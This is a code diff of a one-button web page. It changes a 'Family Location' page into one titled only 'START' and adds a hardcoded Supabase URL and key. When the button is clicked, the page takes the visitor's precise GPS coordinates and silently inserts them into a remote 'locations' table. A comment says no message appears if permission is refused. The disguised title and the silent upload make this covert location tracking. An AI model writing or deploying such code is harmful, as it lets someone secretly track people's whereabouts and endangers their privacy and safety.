@@ -3,7 +3,9 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Family Location</title>
+<title>START</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <style>
 body {
@@ -13,7 +15,6 @@ body {
     justify-content: center;
     align-items: center;
     background: #111;
-    font-family: Arial, sans-serif;
 }
 
 button {
@@ -22,15 +23,14 @@ button {
     font-size: 30px;
     border-radius: 15px;
     border: none;
-    background: #00aaff;
+    background: #008cff;
     color: white;
 }
 
 button:disabled {
-    background: gray;
+    opacity: 0.5;
 }
 </style>
-
 </head>
 
 <body>
@@ -39,38 +39,49 @@ button:disabled {
 
 <script>
 
-const btn = document.getElementById("start");
+const SUPABASE_URL = "https://cwagmwearaiurgmggyxd.supabase.co";
 
-btn.onclick = () => {
+const SUPABASE_KEY = "sb_publishable_b1ga-fKeGD2NxCAp8mmF8Q_x9R4_az9";
 
-    btn.disabled = true;
+const db = supabase.createClient(
+    SUPABASE_URL,
+    SUPABASE_KEY
+);
 
-    if (!navigator.geolocation) {
-        return;
-    }
+const button = document.getElementById("start");
+
+
+button.onclick = () => {
 
     navigator.geolocation.getCurrentPosition(
-        (position) => {
 
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
+    async (position) => {
 
-            console.log("Latitude:", lat);
-            console.log("Longitude:", lon);
-            console.log("Accuracy:", accuracy);
+        await db
+        .from("locations")
+        .insert({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy
+        });
 
-        },
+        button.disabled = true;
 
-        () => {
-            btn.disabled = false;
-        },
+    },
 
-        {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        }
+    () => {
+
+        // اگر اجازه داده نشد، هیچ پیامی نشان داده نمی‌شود
+        button.disabled = false;
+
+    },
+
+    {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+    }
+
     );
 
 };
